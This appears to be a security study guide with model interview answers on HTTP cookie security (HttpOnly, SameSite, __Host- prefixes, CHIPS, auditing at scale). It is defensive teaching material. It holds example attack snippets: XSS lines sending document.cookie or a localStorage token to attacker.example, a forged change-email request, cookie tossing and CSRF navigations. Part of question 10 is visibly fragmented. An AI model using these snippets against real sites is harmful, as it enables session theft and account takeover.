Cookies — HTTP State Management

Category: Browser Security — Session State, Authentication, Tracking
RFC: RFC 6265 (HTTP State Management Mechanism); RFC 6265bis (in progress)
Applies To: All browser-based web applications

Overview

HTTP cookies are name-value pairs stored by the browser and automatically attached to requests matching the cookie's scope. They are the primary mechanism for session management, authentication state, personalization, and tracking across the web. From a security perspective, cookies are the most valuable credential a browser carries — a stolen valid session cookie is essentially equivalent to a stolen password. Cookie security is not just about setting a few flags; it is about understanding exactly what the browser will send, to whom, across what origins, and what JavaScript can access.

At Google scale, every Google service relies on secure cookies for authenticated sessions across billions of users. Even minor misconfiguration — a missing SameSite attribute, a too-broad domain scope, or a missing Secure flag — can result in session theft, CSRF attacks, or cross-subdomain data leakage for millions of users simultaneously.

How It Works

Core Mechanics

The server sets a cookie via the Set-Cookie response header. The browser stores it and sends it back in the Cookie request header on matching future requests.

Setting a Cookie:

Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600

Cookie Attributes:

Attribute Values Effect
Name=Value Any string The cookie data
Domain e.g., example.com Scope: host and all subdomains. Defaults to exact host if omitted
Path e.g., / or /api URL path scope; defaults to path of the Set-Cookie response
Secure Flag (no value) Cookie sent only over HTTPS connections
HttpOnly Flag (no value) Cookie inaccessible to JavaScript (document.cookie returns empty for it)
SameSite Strict, Lax, None Controls cross-site sending behavior
Max-Age Seconds Session cookie if absent or 0; persistent if positive
Expires Date Absolute expiry date; Max-Age takes precedence if both present
Partitioned Flag (CHIPS) Cookie scoped to top-level site context, not shared across sites

SameSite Attribute Deep Dive

SameSite is the primary CSRF defense at the cookie level:

SameSite Value When Cookie Is Sent Use Case
Strict Only on same-site navigations; never on cross-site requests including top-level nav Maximum protection; may break OAuth/OIDC redirect flows
Lax Same-site + safe top-level cross-site navigations (GET, HEAD); not on cross-site POST/PUT/DELETE Default in modern browsers; good balance
None All requests including cross-site, but requires Secure Required for cross-site use (e.g., embedded widgets, federated auth iframes)

Same-site vs same-origin: SameSite uses registrable domain matching (eTLD+1), not origin matching. app.example.com and api.example.com are same-site. app.example.com and attacker.com are cross-site.

HttpOnly — JavaScript Isolation

When HttpOnly is set, the cookie is not accessible via document.cookie, XMLHttpRequest, or the Fetch API's cookie store. It is only automatically sent by the browser at the network layer. This prevents the most common XSS-to-session-theft pathway: an XSS payload reading document.cookie and exfiltrating the session token. However, HttpOnly does not prevent XSS from making requests with the session cookie attached (the browser still sends it automatically).

Cookie Scope: Domain And Path

  • If Domain=example.com is set, cookie is sent to example.com and all subdomains (including evil.example.com if that subdomain is compromised).
  • If Domain is omitted, cookie is only sent to the exact host that set it (more restrictive, better practice for session cookies).
  • Path further restricts scope to URL path prefixes, but path-based scoping is not a security control — any script on the domain can read path-scoped cookies.

Cookie Partitioning (CHIPS — Cookies Having Independent Partitioned State)

Modern browsers are introducing cookie partitioning to limit cross-site tracking. A partitioned cookie is stored with a key that includes both the cookie domain AND the top-level site. The same tracking cookie from tracker.com has separate state when accessed from site-a.com vs site-b.com. Set via the Partitioned attribute. Part of the broader third-party cookie deprecation effort.

Cookie Prefix Security

Modern browsers support cookie prefixes that enforce attribute requirements:

Prefix Requirements Enforced Protection
__Secure- Must have Secure flag Prevents insecure setting
__Host- Must have Secure, no Domain, Path=/ Prevents subdomain injection and scope broadening

Example: Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly; SameSite=Strict

Top 3 Critical Mitigations

  1. Always set HttpOnly on authentication and session cookies. The most common XSS exploitation path is JavaScript reading document.cookie and exfiltrating the session token. HttpOnly closes this single most-used attack vector. It does not stop all XSS harm, but it removes the easiest and most impactful prize.
  2. Set SameSite=Lax or Strict on session cookies. Cross-site request forgery relies on the browser automatically attaching cookies to cross-site requests. SameSite=Lax (the modern browser default) blocks the most common CSRF patterns. SameSite=Strict blocks all cross-site cookie sending, which is the strongest protection but may break redirect-based flows.
  3. Set Secure flag and deploy HSTS. A cookie without Secure can be sent over HTTP, even on a site that primarily uses HTTPS. One mixed-content load or HTTP redirect can expose the session cookie in plaintext. Secure flag + HSTS together ensure cookies never travel over unencrypted connections.

Answers to advanced Questions

Cookie Security — advanced Model Answers

1. What does HttpOnly actually prevent? Does it stop all XSS harm to sessions?

HttpOnly prevents JavaScript from directly reading the cookie through browser APIs like document.cookie. MDN describes HttpOnly as a directive that forbids JavaScript access to the cookie; the cookie is still sent with matching HTTP requests. (MDN Web Docs)

Example:

Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/

With HttpOnly, this JavaScript cannot steal the session value directly:

fetch("https://attacker.example/steal?c=" + document.cookie);

But HttpOnly does not stop all XSS harm.

An attacker with XSS can still:

XSS action Does HttpOnly stop it? Why
Read document.cookie session value Yes Cookie hidden from JavaScript
Make authenticated requests from the victim’s browser No Browser still attaches cookies
Change email/password if no re-auth is required No XSS can submit forms/API calls
Read page DOM data No XSS runs in the page
Exfiltrate CSRF tokens from DOM No Unless protected elsewhere
Modify page UI No XSS controls frontend execution
Install fake login prompt No XSS can manipulate the page
Abuse same-origin API responses No XSS can call APIs and read responses

Example

Even with an HttpOnly cookie, injected JavaScript can do:

await fetch("/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "attacker@example.com" }),
});

The script cannot read the cookie, but the browser sends it automatically.

Model answer

HttpOnly prevents direct cookie theft through JavaScript. It does not neutralize XSS. With XSS, the attacker can still act as the user inside the origin by sending authenticated requests, reading page data, modifying UI, and abusing APIs. HttpOnly reduces session exfiltration risk, but XSS must still be fixed at the source.

2. What is the difference between SameSite=Strict and SameSite=Lax? When would each be appropriate?

SameSite controls whether cookies are sent on cross-site requests. MDN defines SameSite=Strict as sending the cookie only for same-site requests, while SameSite=Lax sends the cookie for same-site requests and certain top-level cross-site navigations. (MDN Web Docs)

Comparison

Setting Cross-site subresource request Cross-site form POST Cross-site top-level GET navigation Typical use
Strict No No No Highly sensitive apps
Lax No Usually no Yes General session cookies
None; Secure Yes Yes Yes Third-party / embedded use cases

SameSite=Strict

Example:

Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict; Path=/

With Strict, if the user clicks a link from email or another site to your app, the browser will not send the cookie on that first cross-site navigation. This is strong CSRF protection but may create usability friction.

Appropriate for:

  • Admin consoles
  • Banking transaction pages
  • Highly sensitive internal tools
  • Step-up authentication cookies
  • Security setting flows
  • Re-authentication state

SameSite=Lax

Example:

Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax; Path=/

With Lax, cookies are sent on top-level safe navigations like clicking a link to the site. This works better for normal logged-in web experiences.

Appropriate for:

  • Normal web app session cookies
  • SaaS applications
  • Consumer apps
  • Apps expecting users to arrive from links, email, Slack, search results

Model answer

Strict provides stronger CSRF resistance but can break expected navigation flows because cookies are not sent on cross-site entry. Lax is a practical default for many session cookies because it blocks most cross-site subresource and form-based CSRF while preserving top-level link navigation. For highly sensitive actions, SameSite should be combined with CSRF tokens, origin checks, and re-authentication.

3. A session cookie is set with Domain=example.com. What subdomains will receive it? What is the security risk?

If a cookie is set with:

Set-Cookie: session=abc; Domain=example.com; Path=/; Secure; HttpOnly

then the cookie is sent to:

example.com
www.example.com
app.example.com
api.example.com
dev.example.com
anything.example.com

MDN states that if Domain is specified, subdomains are always included, and leading dots such as .example.com are ignored by modern specifications. (MDN Web Docs)

Security risk

The risk is that every subdomain becomes part of the session cookie trust boundary.

If any subdomain is vulnerable or less trusted, it may create risk for the parent domain’s session model.

Example

Suppose:

www.example.com        High-security production app
blog.example.com       Old WordPress site
dev.example.com        Forgotten staging app
uploads.example.com    User-controlled content

If the session cookie is scoped to Domain=example.com, then it may be sent to all of these. A compromised or poorly isolated subdomain may be able to interfere with authentication flows, set conflicting cookies, or receive cookies unnecessarily.

Better approach

Prefer host-only cookies:

Set-Cookie: __Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/

No Domain attribute means the cookie is scoped only to the exact host that set it.

Model answer

Domain=example.com makes the cookie available to example.com and all subdomains. The security risk is that the weakest subdomain becomes part of the authentication boundary. A stale dev host, takeover-prone subdomain, or user-content host can potentially influence or receive cookies intended for a more sensitive application.

4. What is cookie tossing and how do the __Host- and __Secure- prefixes prevent it?

Cookie tossing is an attack where a less trusted subdomain sets a cookie for a parent domain, causing the browser to send attacker-controlled cookies to a more sensitive sibling or parent application.

Example attack

Attacker controls or compromises:

evil.example.com

It sets:

Set-Cookie: session=attacker_value; Domain=example.com; Path=/

Now when the victim visits:

https://www.example.com

the browser may send both legitimate and attacker-injected cookies, depending on name/path/domain interactions.

This can cause:

  • Session fixation
  • Login confusion
  • Forced logout
  • App parsing the wrong cookie
  • CSRF token confusion
  • Authentication bypass in badly implemented systems

__Secure- prefix

A cookie named with __Secure- must be set over HTTPS and must include the Secure attribute. MDN documents this prefix requirement. (MDN Web Docs)

Example:

Set-Cookie: __Secure-session=abc; Secure; HttpOnly; SameSite=Lax; Domain=example.com; Path=/

This prevents insecure HTTP origins from setting it, but it does not prevent subdomain cookie tossing if Domain=example.com is still allowed.

__Host- prefix

A cookie named with __Host- must:

  • Be set over HTTPS
  • Include Secure
  • Have Path=/
  • Not include a Domain attribute

MDN notes that __Host- cookies must not specify Domain, so they are not sent to subdomains. (MDN Web Docs)

Example:

Set-Cookie: __Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/

This is stronger because a subdomain cannot set a parent-domain __Host-session cookie.

Comparison

Prefix Requires HTTPS Requires Secure Forbids Domain Requires Path=/ Protects against subdomain cookie tossing
__Secure- Yes Yes No No Partially
__Host- Yes Yes Yes Yes Strongly

Model answer

Cookie tossing happens when a subdomain injects a parent-domain cookie that collides with a sensitive app’s cookie. __Secure- ensures the cookie was set securely over HTTPS, but __Host- is stronger because it forbids the Domain attribute and requires Path=/, binding the cookie to the exact host and preventing subdomains from setting it.

5. Why is storing a session token in localStorage generally worse than storing it in an HttpOnly cookie?

localStorage is readable by JavaScript running on the origin. An HttpOnly cookie is not.

Main difference

// If token is in localStorage, XSS can do this:
const token = localStorage.getItem("access_token");
fetch("https://attacker.example/steal", {
  method: "POST",
  body: token,
});

If the token is in an HttpOnly cookie, XSS cannot directly read the cookie value through JavaScript. (MDN Web Docs)

Risk comparison

Storage location Direct theft by XSS Automatically sent CSRF risk Common use
localStorage High No Lower by default SPA token storage
Non-HttpOnly cookie High Yes Higher Bad session pattern
HttpOnly; Secure; SameSite cookie Lower Yes Must control with SameSite/CSRF protections Traditional web sessions

Why localStorage is usually worse for session tokens

  • Any XSS can steal the token directly.
  • Tokens often survive browser restarts.
  • Tokens are accessible to all scripts on the origin, including compromised third-party scripts.
  • Exfiltrated bearer tokens can be replayed from attacker infrastructure.
  • Logout and revocation are often poorly implemented.
  • Browser security attributes like HttpOnly and SameSite do not apply to localStorage.

Important nuance

An HttpOnly cookie does not make XSS harmless. XSS can still act as the user from inside the browser. But it usually makes offline token theft and replay harder.

Model answer

localStorage is generally worse for session tokens because XSS can read and exfiltrate the token directly. An HttpOnly cookie cannot be read by JavaScript, so XSS can still perform actions as the user, but it is harder to steal the bearer token and replay it elsewhere. The best answer is not just “cookie good, localStorage bad”; it is to combine HttpOnly, Secure, SameSite, CSRF protection, short lifetimes, rotation, and XSS prevention.

6. What is the order of priority for Max-Age vs Expires if both are set on a cookie?

If both Max-Age and Expires are set, Max-Age takes precedence. RFC 6265 states that when both attributes are present, Max-Age controls the expiration date. (IETF Datatracker)

Example:

Set-Cookie: session=abc; Max-Age=3600; Expires=Wed, 01 Jan 2030 00:00:00 GMT; Secure; HttpOnly

The cookie expires in 3600 seconds, not in 2030.

Why Max-Age is preferred

Attribute Meaning Risk
Expires Absolute timestamp Clock skew issues
Max-Age Relative seconds from now More deterministic

Session cookie behavior

If neither is set:

Set-Cookie: session=abc; Secure; HttpOnly

then it is a session cookie and is retained until the browser-defined session ends. RFC 6265 describes this behavior when neither Max-Age nor Expires exists. (IETF Datatracker)

Model answer

Max-Age wins over Expires. If both are present, the browser uses Max-Age. Security-wise, I prefer explicit short Max-Age for session management and server-side revocation rather than relying only on long client-side expiration.

7. How does SameSite=None; Secure interact with third-party cookie deprecation?

SameSite=None; Secure is the required syntax for cookies that need to be sent in cross-site contexts. Google’s developer documentation says cookies marked SameSite=None must also use Secure. (Google for Developers)

Example:

Set-Cookie: widget_session=abc; SameSite=None; Secure; HttpOnly; Path=/

This means:

  • The cookie may be sent in cross-site contexts.
  • It must only be sent over HTTPS.
  • It is eligible for third-party usage, subject to browser policy.

But third-party cookie deprecation changes the picture

Historically, SameSite=None; Secure enabled third-party cookies for use cases like:

  • Embedded login widgets
  • Payment iframes
  • Chat widgets
  • SaaS integrations
  • Federated flows
  • Cross-site personalization

But browsers are reducing or blocking unrestricted third-party cookies to limit cross-site tracking. Chrome’s Privacy Sandbox describes third-party cookie phaseout as an effort to reduce cross-site tracking while supporting use cases through newer technologies. (Google Groups)

So:

SameSite=None; Secure

is necessary for cross-site cookies, but no longer guarantees that the browser will allow unrestricted third-party cookie behavior.

Practical implication

Scenario Old model Newer model
Third-party iframe stores global cookie SameSite=None; Secure works broadly May be blocked or partitioned
Embedded widget needs per-site state Third-party cookie CHIPS / partitioned cookie
Federated login Third-party cookie-based flows FedCM / top-level redirects / Storage Access API depending on case
Cross-site tracking Third-party cookie Intentionally reduced

Model answer

SameSite=None; Secure marks a cookie as cross-site capable and HTTPS-only. But with third-party cookie deprecation, that does not mean the cookie will behave as a global third-party identifier across sites. Browsers are moving toward partitioned or purpose-built alternatives such as CHIPS, Storage Access API, and FedCM-style patterns.

8. What is CHIPS, cookie partitioning, and why are browsers implementing it?

CHIPS means Cookies Having Independent Partitioned State. It allows a third-party cookie to be partitioned by the top-level site, so the same embedded third-party service gets a separate cookie jar per top-level website. Google’s Privacy Sandbox says CHIPS lets developers opt a cookie into partitioned storage with separate cookie jars per top-level site. (Privacy Sandbox)

MDN describes partitioned cookies as being double-keyed by the origin that sets them and the top-level page origin. (MDN Web Docs)

Example

Suppose chat.example is embedded on two sites:

news.com
shop.com

Without partitioning:

chat.example cookie = same value across news.com and shop.com

This enables cross-site tracking.

With CHIPS:

(news.com, chat.example) cookie = value A
(shop.com, chat.example) cookie = value B

The embedded service can maintain state inside each site, but cannot use one shared cookie to track the user across unrelated sites.

Example header

Set-Cookie: __Host-widget_session=abc; Secure; HttpOnly; SameSite=None; Path=/; Partitioned

The Partitioned attribute opts the cookie into partitioned storage. MDN and Chrome documentation note that Partitioned cookies require Secure. (MDN Web Docs)

Why browsers implement it

Browsers are trying to preserve legitimate embedded use cases while reducing cross-site tracking.

Legitimate use cases:

  • Embedded chat widget
  • Payment provider iframe
  • SaaS support widget
  • CDN load balancing
  • Embedded maps
  • Per-site preferences for third-party widgets

Risk being reduced:

One third-party cookie tracking the same user across thousands of unrelated sites

Model answer

CHIPS partitions third-party cookies by top-level site. It allows embedded third-party services to keep per-site state without receiving a single global identifier across the web. Browsers are implementing it to support legitimate third-party embeds while reducing cross-site tracking.

9. A developer sets SameSite=Lax but claims this fully prevents CSRF. Name one CSRF scenario Lax does not prevent.

SameSite=Lax does not fully prevent CSRF.

One important scenario is a state-changing GET endpoint triggered by a top-level cross-site navigation.

Example vulnerable endpoint:

GET /account/delete

If the session cookie is SameSite=Lax, and a victim clicks or is redirected to:

<a href="https://bank.example/account/delete">Click here</a>

or:

<script>
  location.href = "https://bank.example/account/delete";
</script>

the browser may send the Lax cookie because this is a top-level navigation using a safe method such as GET. MDN states that Lax includes top-level navigations with safe methods. (MDN Web Docs)

Why this matters

SameSite=Lax assumes safe methods like GET do not change state. If the application violates HTTP semantics and performs state-changing actions on GET, Lax can be bypassed.

Other scenarios where Lax is insufficient

  • Login CSRF
  • OAuth / SSO flow manipulation
  • Top-level GET state changes
  • Browser-specific grace behavior around recently set cookies
  • Same-site but cross-origin attacks, for example compromised sibling subdomain
  • XSS, which bypasses CSRF protections by running inside the site

Correct controls

Use:

  • CSRF tokens for state-changing actions
  • Origin / Referer validation
  • No state changes on GET
  • SameSite=Strict for sensitive cookies or sensitive flows
  • Re-authentication for critical actions
  • Step-up MFA for high-risk actions

Model answer

SameSite=Lax does not prevent CSRF against state-changing GET endpoints because cookies are sent on top-level safe-method navigations. If /delete-account or /transfer/confirm changes state via GET, an attacker can trigger it through a cross-site navigation. SameSite is not a replacement for correct HTTP method design and CSRF tokens.

10. At Google scale, how would you audit millions of Set-Cookie headers across thousands of services to ensure all session cookies have HttpOnly, Secure, and appropriate SameSite values?

At Google scale, I would not solve this with manual reviews. I would build a cookie governance control plane combining static analysis, runtime telemetry, policy-as-code, service ownership, automated enforcement, and exception management.

The goal is:

Every session cookie is discoverable, classified, owned, policy-checked, and continuously monitored.

Cookie parsing must follow browser semantics, not naive string matching.

  httpOnly: true,
  secure: true,
  sameSite: "lax",
});

Step 6: Enforce at platform layer

At scale, many teams will make mistakes. Central platforms should provide safe defaults.

Examples:

  • Central auth library always sets secure cookies.
  • API gateway rejects unsafe Set-Cookie for session names.
  • Edge proxy appends or normalizes attributes where safe.
  • Framework templates use secure defaults.
  • Golden path libraries are mandatory for session creation.

Example central library:

Cookie session = CookieBuilder.name("__Host-session")
    .value(token)
    .secure(true)
    .httpOnly(true)
    .sameSite("Lax")
    .path("/")
    .maxAge(Duration.ofHours(1))
    .build();

Important: blindly modifying cookies at the edge can break apps, especially around SameSite=None, domain/path scoping, and embedded flows. Prefer central libraries and policy enforcement.

Runtime is the source of truth.

Alert when production emits:

IF cookie.classification IN ["definitely_session", "likely_session"]

Step 8: Exception management

Some cookies legitimately need unusual behavior.

Example:

Set-Cookie: embed_session=abc; SameSite=None; Secure; Partitioned; HttpOnly

Exception records should include:

{
  "cookie_name": "embed_session",
  "service": "support-widget",
  "owner": "customer-platform",
  "reason": "Third-party embedded support widget",
  "approved_by": "AppSec + Privacy",
  "expires": "2026-08-01",
  "required_controls": ["Secure", "HttpOnly", "Partitioned"]
}

No permanent exceptions without re-review.

Step 10: Rollout strategy

For millions of cookies, use staged enforcement:

  1. Discover and inventory.
  2. Classify and assign owners.
  3. Report-only mode.
  4. Fix central libraries.
  5. Block new violations in CI.
  6. Remediate existing high-risk cookies.
  7. Add runtime enforcement.
  8. Require exceptions for non-compliant cookies.
  9. Periodically re-audit.

Model answer

At Google scale, I would create a cookie security control plane. It would collect Set-Cookie headers from edge traffic, service mesh, synthetic crawlers, browser telemetry, CI/CD, and source code. It would classify session cookies, parse attributes using browser-accurate semantics, check them against policy-as-code, map every cookie to a service owner, block new violations in CI/CD, alert on production violations, and manage short-lived exceptions. The key is moving from manual header review to continuous inventory, ownership, automated policy, and secure-by-default platform libraries.

Final Senior Security Engineer Summary

For secure session cookies, the baseline should be:

Set-Cookie: __Host-session=<opaque-random-value>; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600

For highly sensitive flows:

Set-Cookie: __Host-admin_session=<opaque-random-value>; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=900

For legitimate third-party embedded use cases:

Set-Cookie: __Host-widget_session=<opaque-random-value>; Secure; HttpOnly; SameSite=None; Path=/; Partitioned

The key message:

Cookie security is about controlling three things: who can read the cookie, where it is sent, and which hosts can set or override it. HttpOnly reduces token theft from XSS, Secure protects transport, SameSite reduces CSRF, __Host- reduces subdomain cookie injection, and CHIPS reduces cross-site tracking while preserving embedded use cases. At large scale, these controls must be enforced through platform defaults and continuous telemetry, not developer memory.

Key Takeaways

  • Cookies are the primary browser credential; their security flags are the first line of defense for session security.
  • HttpOnly prevents JS from reading cookies; Secure prevents HTTP transmission; SameSite restricts cross-site sending.
  • SameSite=Lax is the modern browser default and prevents most CSRF patterns; Strict is stronger but may break OAuth flows.
  • Use __Host- prefix for maximum cookie security: forces Secure, no Domain, Path=/.
  • Never store sensitive tokens in localStorage or sessionStorage — they are accessible to any JS on the page.
  • Cookie scope (Domain attribute) should be as narrow as possible; omitting Domain scopes to exact host only.
